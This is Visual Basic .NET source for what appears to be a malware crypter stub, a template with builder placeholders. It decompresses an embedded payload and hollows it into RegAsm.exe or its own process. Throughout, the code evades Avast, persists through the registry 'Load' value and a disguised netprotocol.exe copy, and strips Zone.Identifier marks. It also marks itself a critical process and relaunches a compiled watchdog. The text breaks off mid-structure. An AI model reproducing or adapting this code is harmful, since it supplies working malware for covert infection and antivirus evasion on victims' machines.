%IMPORTS%

Module fede

    Private check As Mutex

    Public Sub checkifopen(ByVal mute As String)
        Try
            System.Threading.Mutex.OpenExisting(mute)
            End
        Catch ex As Exception
            check = New System.Threading.Mutex(False, mute)
            Exit Sub
        End Try
    End Sub

	Public Function DEC(ThrowApples As Byte(), Optional VAR12 As Integer = 70) As Byte()
       ' Dim VAR11 As Byte() = New Byte(VAR13.Length - VAR12 - 1) {}
      '  Buffer.BlockCopy(VAR13, VAR12, VAR11, 0, VAR11.Length)
	       Dim data() As Byte : Dim totalBytesRead As Int32 = 0
        Dim dataStr As New GZipStream(New MemoryStream(ThrowApples), CompressionMode.Decompress, True)
        Dim dataChunks As Integer = ThrowApples.Length
        Try : While True
                ReDim Preserve data(totalBytesRead + dataChunks)
                Dim bytesRead As Int32 = dataStr.Read(data, totalBytesRead, dataChunks)

                If bytesRead = 0 Then Exit While
                totalBytesRead += bytesRead
            End While
            ReDim Preserve data(totalBytesRead - 1)
            Return data

        Catch : Return Nothing : End Try

      '  For i As Integer = 0 To VAR11.Length - 1
      '      VAR11(i) = VAR11(i) Xor VAR13(i Mod VAR12)
      '  Next
      '  Return VAR11
    End Function

	Sub Main()
	try
        checkifopen("%MUTEX%")
		catch 
		end try

		runpe.avast()

        Dim ResManager As New Resources.ResourceManager("X", Reflection.Assembly.GetExecutingAssembly)
        Dim ResBytes As Byte() = (DirectCast(ResManager.GetObject("M"), Byte()))
        Dim zBytes() As Byte = DEC(ResBytes)
        Dim binder As String = "%BINDEROFF%"

        If Application.executablepath = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe" Then
       '###ADD TO STARTUP - REGISTRY 
        If My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows\","Load", Nothing) Is Nothing Then
        Dim CMD As String = String.Format("/c reg add ""{0}"" /v ""{1}"" /d ""{2}"" /f", "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows", "Load", application.executablepath)
	    Dim PI = New ProcessStartInfo("cmd", CMD)
        PI.WindowStyle = ProcessWindowStyle.Hidden
        Process.Start(PI).WaitForExit(5000)
        End If
        else

            If binder = "%BINDERON%" Then
                Try
                    Dim res2 As New Resources.ResourceManager("B", Reflection.Assembly.GetExecutingAssembly)
                    Dim ResBytes2 As Byte() = (DirectCast(res2.GetObject("Bind" & "%BIND1%"), Byte()))
                    IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & "%BIND1%", ResBytes2)
                    DeleteFile(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & "%BIND1%" + ":Zone.Identifier")
                    Process.Start(My.Computer.FileSystem.SpecialDirectories.Temp & "\" & "%BIND1%")
                    System.Threading.Thread.Sleep(1000)
                    Dim bindmore As String = "%BIND2OFF%"

               %BINDZ2%

                    Dim bindmore3 As String = "%BIND3OFF%"

				  %BINDZ3%

                Catch x As Exception
                    GoTo OUT
                End Try
            End If

        End If
OUT:


        Dim delayex As String = "%DELAYOFF%"

        If delayex = "%DELAYON%" Then

	    system.threading.thread.sleep(%DELAY%)
        End If

        Dim messagepop As String = "%MESSAGETITLE%"
        Dim messagetext As String = "%MESSAGETEXT%"
        Dim messagetype As String = "%MESSAGETYPE%"

		if application.executablepath.contains("AppData") then
		else
            If messagetype = "%CRITICAL%" Then
                MsgBox(messagetext, MsgBoxStyle.Critical, messagepop)
            End If
            If messagetype = "%INFO%" Then
                MsgBox(messagetext, MsgBoxStyle.Information, messagepop)
            End If
			end if
   
	
        Dim startup As String = "%STARTUPOFF%"
        Dim pathme As String = Application.ExecutablePath        

	    If startup = "%STARTUPON%" Then

		Dim criticalp As String = "%CRITICALPROCESSOFF%"
		If pathme = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe" then
		           If criticalp = "%CRITICALPROCESSON%" Then
                    Dim os As String = My.Computer.Info.OSFullName
                    If os.tostring.contains("XP") Then
                        CriticalProcess(System.Diagnostics.Process.GetCurrentProcess().Handle)
                    Else
                        ProtectMe.Protect()
                    End If
                End If
				'GoTo Hell
		else
			 'COPY + OLD REG STARTUP
			 if io.file.exists(GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe") then
			 io.file.delete(GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe")
			 end if
			  try			    
			  if io.directory.exists(GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\") then
			  else
			  IO.Directory.CreateDirectory(GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\")
			  end if
		      io.file.writealltext(my.computer.filesystem.specialdirectories.temp & "\info.txt", GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe")
		'	 Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", True).SetValue("Settings1", CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\netprotocol.exe")
	     '  Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", True).SetValue("Load", "cmd /c " & CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\netprotocol.exe")
		   if io.file.exists(My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\man.log") then
		   io.file.delete(My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\man.log")
		   end if
		    io.file.writeallbytes(My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\man.log",io.file.readallbytes(application.executablepath))
			io.file.move(My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\man.log",CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe")
           DeleteFile(CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe" + ":Zone.Identifier")
		  
	   catch 
	   end try

		   ' Dim startupsource As Byte() = (DirectCast(ResManager.GetObject("startsource"), Byte()))
         '   Dim startupsourcetwo As Byte() = (DirectCast(ResManager.GetObject("startupsourcetwo"), Byte()))
         '   Dim startupsourcerenamer As Byte() = (DirectCast(ResManager.GetObject("startuprenamer"), Byte()))

          '  Dim startupsourcestring As String = System.Text.Encoding.Unicode.GetString(startupsource)
         '   Dim startupsourcestringtwo As String = System.Text.Encoding.Unicode.GetString(startupsourcetwo)
        '   Dim startuprenamersource As String = System.Text.Encoding.Unicode.GetString(startupsourcerenamer)

         '   startupsourcestring = startupsourcestring.Replace("@PATH@", Application.ExecutablePath)
         '   startupsourcestringtwo = startupsourcestringtwo.Replace("@PATH@", Application.ExecutablePath)
		
		'	if "%PMP%" = "YES" then
		'	startupsourcestring = startupsourcestring.replace("%ENABLE%","-ON-")
		'	else

			'end if
          '  compilerz(My.Computer.FileSystem.SpecialDirectories.Temp & "\WLIDSPC.exe", startupsourcestring)
        '    compilerz(My.Computer.FileSystem.SpecialDirectories.Temp & "\dwlm.exe", startupsourcestringtwo)
   'compilerz(My.Computer.FileSystem.SpecialDirectories.Temp & "\settings.exe", startuprenamersource)
         ' Dim file2$ = My.Computer.FileSystem.SpecialDirectories.Temp & "\settings.exe"
          ' DeleteFile(file2 + ":Zone.Identifier")
        '    Dim file3$ = My.Computer.FileSystem.SpecialDirectories.Temp & "\WLIDSPC.exe"
        '    DeleteFile(file3 + ":Zone.Identifier")
         '   Dim file4$ = My.Computer.FileSystem.SpecialDirectories.Temp & "\dwlm.exe"
       '     DeleteFile(file4 + ":Zone.Identifier")

          '  Dim process As New Process()
          '  process.StartInfo.FileName = My.Computer.FileSystem.SpecialDirectories.Temp & "\WLIDSPC.exe"
          '  process.StartInfo.Arguments = "-n"
         '   process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
         '   process.Start()
         '   process.WaitForExit()
			
		'	End
	
'Dim wsh As Object = CreateObject("WScript.Shell")
'wsh = CreateObject("WScript.Shell")
'Dim MyShortcut, DesktopPath
'DesktopPath = wsh.SpecialFolders("Startup")
'MyShortcut = wsh.CreateShortcut(DesktopPath & "\ShortSnort.lnk")
'MyShortcut.TargetPath = wsh.ExpandEnvironmentStrings(CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe")
'MyShortcut.WorkingDirectory = wsh.ExpandEnvironmentStrings(CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\")
'MyShortcut.WindowStyle = 0
'MyShortcut.Save()

            'Dim arg_46_0 As Process = New Process()
            'Dim args As String = "ping 127.0.0.1 -n 15 > nul & start " & CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe"
            'Dim startInfo As ProcessStartInfo = New ProcessStartInfo() With {.WindowStyle = ProcessWindowStyle.Hidden, .FileName = Environment.SystemDirectory + "\cmd.exe", .ErrorDialog = False, .UseShellExecute = True, .Arguments = args + " & exit"}
            'arg_46_0.StartInfo = startInfo
            'arg_46_0.Start()

	Dim process As New Process()
            process.StartInfo.FileName = CStr(Environ("USERPROFILE")) & "\Appùming".Replace("ù", "Data\Roa") & "\Microsoft\Windows\ScreenToGif\netprotocol.exe"
            process.StartInfo.Arguments = "-n"
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            process.Start()
          end
        
		End If
		End if
		
Hell:
Hell2:

        Try

            Dim persistance As String = "%PERSISTANCEOFF%"

            If persistance = "%PERSISTANCEON%" Then
                If IO.File.Exists(My.Computer.FileSystem.SpecialDirectories.Temp & "\spoolsc.exe") Then
				GoTo Nextt
                Else
                    Dim persisource As Byte() = (DirectCast(ResManager.GetObject("persistancesource"), Byte()))
                    Dim persisourcestring As String = System.Text.Encoding.Unicode.GetString(persisource)
                    compilerz(My.Computer.FileSystem.SpecialDirectories.Temp & "\spoolsc.exe", persisourcestring)
                    Dim file6$ = My.Computer.FileSystem.SpecialDirectories.Temp & "\spoolsc.exe"
                    DeleteFile(file6 + ":Zone.Identifier")
                    System.threading.thread.sleep(500)
                    'Dim processorg As New Process()
                   'processorg.StartInfo.FileName = My.Computer.FileSystem.SpecialDirectories.Temp & "\spoolsc.exe"
                    'processorg.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                    'processorg.Start()
                    'End
                End If

 End If

 Nextt:


                    Dim injection As String = "%DEFAULTINJECTION%"

                    If injection = "%ITSELFINJECTION%" Then    
                     RunPE.doIt(Process.GetCurrentProcess().MainModule.FileName, "", zbytes, True)			 			
                    Else
                     RunPE.doIt("C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe", "", zbytes, True)	
                    End If

        Catch
        End Try
    End Sub

    Public Function ret() As String
        Return "a".Replace("a", CStr(Environ("US4ILE".Replace("4", "ERPROF"))))
    End Function

    <DllImport("ntdll.dll", SetLastError:=True)> _
    Private Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
    End Function

    Private Sub CriticalProcess(handle As IntPtr)
        Try
            Dim isCritical As Integer = 1
            Dim BreakOnTermination As Integer = &H1D
            NtSetInformationProcess(handle, BreakOnTermination, isCritical, 4)
        Catch
        End Try
    End Sub

    Public Function compilerz(ByVal output As String, ByVal source As String)
        Dim Compiler As ICodeCompiler = New VBCodeProvider().CreateCompiler
        Dim Parameters As New CompilerParameters
        Dim cResults As CompilerResults
        Parameters.GenerateExecutable = True
        Parameters.OutputAssembly = output ' 


        Parameters.ReferencedAssemblies.Add("System.dll")
        Parameters.ReferencedAssemblies.Add("System.Data.dll")
        Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")
        Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        'Parameters.ReferencedAssemblies.Add("System.Drawing.dll")
        cResults = Compiler.CompileAssemblyFromSource(Parameters, source)
    End Function

    <DllImport("kernel32", CharSet:=CharSet.Unicode, SetLastError:=True)> _
    Public Function DeleteFile(ByVal name As String) As <MarshalAs(UnmanagedType.Bool)> Boolean
    End Function

End Module



Public Class NETfile
    Shared Function isDotNet(ByVal bytesdotnet As Byte()) As Boolean
        Try
            Assembly.Load(bytesdotnet)
            Return True
        Catch
            Return False
        End Try
    End Function
End Class

Public Class RunPE

    Private Delegate Function CreateProcessA(applicationName As String, commandLine As String, processAttributes As IntPtr, threadAttributes As IntPtr, inheritHandles As Boolean, creationFlags As UInteger, environment As IntPtr, currentDirectory As String, ByRef startupInfo As STARTUP_INFORMATION, ByRef processInformation As PROCESS_INFORMATION) As Boolean
    Private Delegate Function RPM(process As IntPtr, baseAddress As Integer, ByRef buffer As Integer, bufferSize As Integer, ByRef bytesRead As Integer) As Boolean
    Private Delegate Function ReadProcessMemory2(process As IntPtr, baseAddress As Integer, ByRef buffer As Byte(), bufferSize As Integer, ByRef bytesRead As Integer) As Boolean
    Private Delegate Function WriteProcessMemory(process As IntPtr, baseAddress As Integer, buffer As Byte(), bufferSize As Integer, ByRef bytesWritten As Integer) As Boolean
    Private Delegate Function GetThreadContext(thread As IntPtr, context As Integer()) As Boolean
    Private Delegate Function SetThreadContext(thread As IntPtr, context As Integer()) As UInteger
    Private Delegate Function NtUnmapViewOfSection(process As IntPtr, baseAddress As Integer) As Integer
    Private Delegate Function VirtualAllocEx(handle As IntPtr, address As Integer, length As Integer, type As Integer, protect As Integer) As Integer
    Private Delegate Function ResumeThread(handle As IntPtr, <Out()> ByRef SuspendCount As UInteger) As Integer

	  Public Shared Function doIt(byval pathz as string, cmd As String, data As Byte(), compatible As Boolean) As Integer
        Dim createProcessA As CreateProcessA = makeAPI(Of CreateProcessA)("kernel32", "CreateProcessA")
        Dim rPM As RPM = makeAPI(Of RPM)("kernel32", "ReadProcessMemory")
        makeAPI(Of ReadProcessMemory2)("kernel32", "ReadProcessMemory")
        Dim writeProcessMemory As WriteProcessMemory = makeAPI(Of WriteProcessMemory)("kernel32", "WriteProcessMemory")
        Dim getThreadContext As GetThreadContext = makeAPI(Of GetThreadContext)("kernel32", "GetThreadContext")
        Dim setThreadContext As SetThreadContext = makeAPI(Of SetThreadContext)("ntdll", "NtSetContextThread")
        Dim ntUnmapViewOfSection As NtUnmapViewOfSection = makeAPI(Of NtUnmapViewOfSection)("ntdll", "NtUnmapViewOfSection")
        Dim virtualAllocEx As VirtualAllocEx = makeAPI(Of VirtualAllocEx)("kernel32", "VirtualAllocEx")
        Dim resumeThread As ResumeThread = makeAPI(Of ResumeThread)("ntdll", "NtResumeThread")
        Dim num As Integer = 0
        Dim executablePath As String = pathz
        Dim text As String = String.Format("""{0}""", executablePath)
        Dim sTARTUP_INFORMATION As STARTUP_INFORMATION = Nothing
        Dim PI As PROCESS_INFORMATION = Nothing
        sTARTUP_INFORMATION.Size = Convert.ToUInt32(Marshal.SizeOf(GetType(STARTUP_INFORMATION)))
		  Try

            If String.IsNullOrEmpty(cmd) Then
                If Not createProcessA(executablePath, text, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, sTARTUP_INFORMATION, PI) Then
                    Throw New Exception()
                End If
            Else
                text = text + " " + cmd
                If Not createProcessA(executablePath, text, IntPtr.Zero, IntPtr.Zero, False, 4, IntPtr.Zero, Nothing, sTARTUP_INFORMATION, PI) Then
                    Throw New Exception()
                End If
            End If
            Dim num2 As Integer = BitConverter.ToInt32(data, 60)
            Dim num3 As Integer = BitConverter.ToInt32(data, num2 + 52)
            Dim array As Integer() = New Integer(179 - 1) {}
            array(0) = 65538
            If Not getThreadContext(PI.ThreadHandle, array) Then
                Throw New Exception()
            End If
            Dim num4 As Integer = array(41)
            Dim num5 As Integer = 0
            If Not rPM(PI.ProcessHandle, num4 + 8, num5, 4, num) Then
                Throw New Exception()
            End If
            If num3 = num5 AndAlso ntUnmapViewOfSection(PI.ProcessHandle, num5) <> 0 Then
                Throw New Exception()
            End If
			    Dim length As Integer = BitConverter.ToInt32(data, num2 + 80)
            Dim num6 As Integer = BitConverter.ToInt32(data, num2 + 84)
            Dim flag As Boolean = False
            Dim num7 As Integer = virtualAllocEx(PI.ProcessHandle, num3, length, 12288, 64)
            If Not compatible AndAlso num7 = 0 Then
                flag = True
                num7 = virtualAllocEx(PI.ProcessHandle, 0, length, 12288, 64)
            End If
            If num7 = 0 Then
                Throw New Exception()
            End If
            If Not writeProcessMemory(PI.ProcessHandle, num7, data, num6, num) Then
                Throw New Exception()
            End If
            Dim num8 As Integer = num2 + 248
            Dim num9 As Short = BitConverter.ToInt16(data, num2 + 6)
            For i As Integer = 0 To (num9 - 1)
                Dim num10 As Integer = BitConverter.ToInt32(data, num8 + 12)
                Dim num11 As Integer = BitConverter.ToInt32(data, num8 + 16)
                Dim srcOffset As Integer = BitConverter.ToInt32(data, num8 + 20)
                If num11 <> 0 Then
                    Dim array2 As Byte() = New Byte(num11 - 1) {}
                    Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length)
                    Dim arg_2EB_0 As WriteProcessMemory = writeProcessMemory
                    Dim arg_2EB_1 As IntPtr = PI.ProcessHandle
                    Dim arg_2EB_2 As Integer = num7 + num10
                    Dim expr_2E6 As Byte() = array2
                    If Not arg_2EB_0(arg_2EB_1, arg_2EB_2, expr_2E6, expr_2E6.Length, num) Then
                        Throw New Exception()
                    End If
                End If
                num8 += 40
            Next

			   Dim bytes As Byte() = BitConverter.GetBytes(num7)
            If Not writeProcessMemory(PI.ProcessHandle, num4 + 8, bytes, 4, num) Then
                Throw New Exception()
            End If
            Dim num12 As Integer = BitConverter.ToInt32(data, num2 + 40)
            If flag Then
                num7 = num3
            End If
            array(44) = num7 + num12
            If setThreadContext(PI.ThreadHandle, array) <> 0 Then
                Throw New Exception()
            End If

if application.executablepath.contains("AppData") then
Const  zn As Integer = 10000

Dim cc As Integer = 0

Dim mutexees As New Stack(Of Mutex)()

While System.Math.Max(System.Threading.Interlocked.Increment(cc),cc - 1) < zn
 mutexees.Push(New Mutex(True))
End While
cc = 0
While System.Math.Max(System.Threading.Interlocked.Increment(cc),cc - 1) < zn
End While
system.threading.thread.sleep(1000)
 end if

			if "%ANTIMEMOFF%" = "%ANTIMEMON%" then
	        Dim par As Object() = {num6, num7, PI} 
            Dim thread As New Thread(new ParameterizedThreadStart(AddressOf Antichrist))
            thread.Start(par)
		    While thread.IsAlive
			thread.sleep(2000)
			   If "%PERSISTANCEOFF%" = "%PERSISTANCEON%" Then
		        if Application.executablepath = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe"
                Do
                    System.threading.thread.sleep(1500)
                    AmericaApp()
                Loop
				End if
				End if


                If "%CRITICALPROCESSOFF%" = "%CRITICALPROCESSON%" Then
				      If Application.executablepath = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe" Then
	                  Do
					   system.threading.thread.sleep(2500)
                       AmericaAppz()
                      Loop
                End If
				end if
            End While

			else
			
            Dim num13 As UInteger = 0
			  If resumeThread(PI.ThreadHandle, num13) = -1 Then
              Throw New Exception()
              End If     

			      If "%PERSISTANCEOFF%" = "%PERSISTANCEON%" Then
		        if Application.executablepath = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe"
                Do
			
                    System.threading.thread.sleep(1500)
                    AmericaApp()
                Loop
				End if
				End if


                If "%CRITICALPROCESSOFF%" = "%CRITICALPROCESSON%" Then
			
				      If Application.executablepath = GetFolderPath(SpecialFolder.ApplicationData) & "\Microsoft\Windows\ScreenToGif\netprotocol.exe" Then
	                   Do
					   system.threading.thread.sleep(2500)
                       AmericaAppz()
                       Loop
                End If
				end if
              End if 
		
	
        Catch ex As Exception
            Dim processById As Process = Process.GetProcessById(Convert.ToInt32(PI.ProcessId))
            If processById IsNot Nothing Then
             ' processById.Kill()
            End If
            Return 0
        End Try
		
End Function
  <DllImport("kernel32.dll", CharSet:=CharSet.[Auto], ExactSpelling:=False)> _
        Public Shared Function GetModuleHandle(ByVal lpModuleName As String) As IntPtr
        End Function
 Public Shared Sub avast()
            Try
                Dim moduleHandle As IntPtr = GetModuleHandle("snxhk.dll")
                While moduleHandle <> IntPtr.Zero
                    moduleHandle = GetModuleHandle("snxhk.dll")
                    Thread.Sleep(500)
                End While
            Catch
            End Try
        End Sub


Public Shared Sub Antichrist(ByVal obj As Object)
        Dim resumeThread As ResumeThread = makeAPI(Of ResumeThread)("ntdll", "NtResumeThread")
        Dim num6 As Integer = obj(0)
        Dim num7 As Integer = obj(1)
        Dim PI As PROCESS_INFORMATION = obj(2)
        Dim dEBUG_EVENT As DEBUG_EVENT = Nothing
        If Not DebugActiveProcess(PI.ProcessId) Then
            Throw New Exception()
        End If
       
        DebugSetProcessKillOnExit(False)
        Dim num14 As UInteger = 64
        Dim flag2 As Boolean = False
        Dim t As New Thread(New ParameterizedThreadStart(AddressOf dick))
        t.Start(PI.ProcessId)
        While Not flag2
	
            If Not WaitForDebugEvent(dEBUG_EVENT, -1) Then
                Throw New Exception()
            End If
            Dim dwDebugEventCode As DebugEventType = dEBUG_EVENT.dwDebugEventCode
            If dwDebugEventCode <> DebugEventType.EXCEPTION_DEBUG_EVENT Then
                If dwDebugEventCode <> DebugEventType.CREATE_PROCESS_DEBUG_EVENT Then
                    ContinueDebugEvent(dEBUG_EVENT.dwProcessId, dEBUG_EVENT.dwThreadId, 65538)
                Else
                    Try
                        If Not VirtualProtectEx(PI.ProcessHandle, CUInt(num7), num6, 320, num14) Then
                            Throw New Exception("FAILED")
                        End If
                    Catch ex_4AF As Exception
                        If Not VirtualProtectEx(PI.ProcessHandle, CUInt(num7), num6, 320, num14) Then
                            Throw New Exception("FAILED")
                        End If
                    End Try
				' 
               Dim num15 As UInteger = 0
                    If ResumeThread(PI.ThreadHandle, num15) = -1  Then
                        Throw New Exception("THREAD RESUME FAILED")
                    End If
                    Thread.Sleep(2000)
                    ContinueDebugEvent(dEBUG_EVENT.dwProcessId, dEBUG_EVENT.dwThreadId, 65538)
                End If
            Else
                If dEBUG_EVENT.Exception.ExceptionRecord.ExceptionCode = 2147483649 Then
                    ContinueDebugEvent(dEBUG_EVENT.dwProcessId, dEBUG_EVENT.dwThreadId, 65538)
					' CUInt(num7)
                    If Not VirtualProtectEx(PI.ProcessHandle, num7, num6, 320, num14) Then
                        Throw New Exception("REPROTECT FAILED")
                    End If
                  
					Continue While
                Else
                    ContinueDebugEvent(dEBUG_EVENT.dwProcessId, dEBUG_EVENT.dwThreadId, 65538)
                End If
            End If
	
            GC.Collect()

        End While

    End Sub

	 Private Shared Sub dick(penis As Object)
        While True
            Try
                Process.GetProcessById(penis)
            Catch ex_0A As Exception
             '   Process.GetCurrentProcess().Kill()
            End Try
            Thread.Sleep(2000)
            GC.Collect()
        End While
    End Sub

		shared p() As Process
	public shared Sub AmericaApp()
        p = Process.GetProcessesByName("spoolsc")
        If p.Length > 0 Then
            ' Process is running
            System.Threading.Thread.Sleep(100)
        Else
            Dim processorg As New Process()
            processorg.StartInfo.FileName = My.Computer.FileSystem.SpecialDirectories.Temp & "\spoolsc.exe"
            processorg.StartInfo.Arguments = "-n"
            processorg.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            processorg.Start()
            processorg.WaitForExit()
        End If
    End Sub
    Public shared Sub AmericaAppz()
        Try
            Dim count As Integer
Again:
            count = 0
            For Each pro As Process In Process.GetProcessesByName("netprotocol")
                count += 1
                If count > 3 Then
                    count = 2
                    GoTo Again
                End If
            Next
           If count = 1 Then
                Dim ResManager As New Resources.ResourceManager("X", Reflection.Assembly.GetExecutingAssembly)
                Dim ResBytes As Byte() = (DirectCast(ResManager.GetObject("M"), Byte()))
                Dim zBytes() As Byte = DEC(ResBytes)
                Dim injection As String = "%DEFAULTINJECTION%"
                If injection = "%ITSELFINJECTION%" Then
                RunPE.doIt(Process.GetCurrentProcess().MainModule.FileName, "", zbytes, True)	
                Else
                 RunPE.doIt("C:\Windows\Microsoft.NET\Framework\v2.0.50727\RegAsm.exe", "", zbytes, True)
                count = 2
            End If
			end if
        Catch
        End Try
    End Sub

    Private Shared Function makeAPI(Of T)(name As String, method As String) As T
        Return CType((CObj(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), GetType(T)))), T)
    End Function

    Public Declare Function VirtualProtectEx Lib "kernel32.dll" (hProcess As IntPtr, dwAddress As UInteger, nSize As Integer, flNewProtect As UInteger, ByRef lpflOldProtect As UInteger) As Boolean
    Public Declare Function DebugActiveProcess Lib "Kernel32.dll" (dwProcessId As Integer) As Boolean
    Public Declare Function WaitForDebugEvent Lib "Kernel32.dll" (<Out()> ByRef lpDebugEvent As DEBUG_EVENT, dwMilliseconds As Integer) As Boolean
    Public Declare Function DebugSetProcessKillOnExit Lib "Kernel32.dll" (<[In]()> KillOnExit As Boolean) As Boolean
    Public Declare Function ContinueDebugEvent Lib "Kernel32.dll" (dwProcessId As Integer, dwThreadId As Integer, dwContinueStatus As Integer) As Boolean
    Public Declare Function IsWow64Process Lib "kernel32.dll" (<[In]()> processHandle As IntPtr, <MarshalAs(UnmanagedType.Bool)> <Out()> ByRef wow64Process As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
    Public Declare Function GetProcAddress Lib "kernel32.dll" (hModule As IntPtr, procName As String) As IntPtr
    Public Declare Function LoadLibraryA Lib "kernel32.dll" (dllToLoad As String) As IntPtr
	
	 Public Structure DEBUG_EVENT
        Public dwDebugEventCode As DebugEventType
        Public dwProcessId As Integer
        Public dwThreadId As Integer

        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=86, ArraySubType:=UnmanagedType.U1)> _
        Private debugInfo As Byte()
        Public ReadOnly Property Exception() As EXCEPTION_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of EXCEPTION_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property CreateThread() As CREATE_THREAD_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of CREATE_THREAD_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property CreateProcessInfo() As CREATE_PROCESS_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of CREATE_PROCESS_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property ExitThread() As EXIT_THREAD_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of EXIT_THREAD_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property ExitProcess() As EXIT_PROCESS_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of EXIT_PROCESS_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property LoadDll() As LOAD_DLL_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of LOAD_DLL_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property UnloadDll() As UNLOAD_DLL_DEBUG_INFO
            Get
                Return Me.GetDebugInfo(Of UNLOAD_DLL_DEBUG_INFO)()
            End Get
        End Property

        Public ReadOnly Property DebugString() As OUTPUT_DEBUG_STRING_INFO
            Get
                Return Me.GetDebugInfo(Of OUTPUT_DEBUG_STRING_INFO)()
            End Get
        End Property

        Public ReadOnly Property RipInfo() As RIP_INFO
            Get
                Return Me.GetDebugInfo(Of RIP_INFO)()
            End Get
        End Property

        Private Function GetDebugInfo(Of T As Structure)() As T
            Dim num As Integer = Marshal.SizeOf(GetType(T))
            Dim intPtr As IntPtr = Marshal.AllocHGlobal(num)
            Marshal.Copy(Me.debugInfo, 0, intPtr, num)
            Dim arg_3B_0 As Object = Marshal.PtrToStructure(intPtr, GetType(T))
            Marshal.FreeHGlobal(intPtr)
            Return CType((CObj(arg_3B_0)), T)
        End Function
    End Structure
	
    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
    Public Structure PROCESS_INFORMATION
        Public ProcessHandle As IntPtr
        Public ThreadHandle As IntPtr
        Public ProcessId As UInteger
        Public ThreadId As UInteger
    End Structure

    <StructLayout(LayoutKind.Sequential, Pack:=1)> _
    Public Structure STARTUP_INFORMATION
        Public Size As UInteger
        Public Reserved1 As String
        Public Desktop As String
        Public Title As String
        <MarshalAs(UnmanagedType.ByValArray, SizeConst:=36)> _
        Public Misc As Byte()
        Public Reserved2 As IntPtr
        Public StdInput As IntPtr
        Public StdOutput As IntPtr
        Public StdError As IntPtr
    End Structure

	  Public Enum DebugEventType
        CREATE_PROCESS_DEBUG_EVENT = 3
        CREATE_THREAD_DEBUG_EVENT = 2
        EXCEPTION_DEBUG_EVENT = 1
        EXIT_PROCESS_DEBUG_EVENT = 5
        EXIT_THREAD_DEBUG_EVENT = 4
        LOAD_DLL_DEBUG_EVENT = 6
        OUTPUT_DEBUG_STRING_EVENT = 8
        RIP_EVENT
        UNLOAD_DLL_DEBUG_EVENT = 7
    End Enum

	  Public Enum Protection As UInteger
        PAGE_EXECUTE_READWRITE = 64
        PAGE_GUARD = 256
    End Enum

    Public Structure CREATE_THREAD_DEBUG_INFO
        Public hThread As IntPtr
        Public lpThreadLocalBase As IntPtr
        Public lpStartAddress As PTHREAD_START_ROUTINE
    End Structure

    Public Structure EXCEPTION_DEBUG_INFO
        Public ExceptionRecord As EXCEPTION_RECORD
        Public dwFirstChance As UInteger
    End Structure

    Public Structure EXCEPTION_RECORD
        Public ExceptionCode As UInteger
        Public ExceptionFlags As UInteger
        Public ExceptionRecord As IntPtr
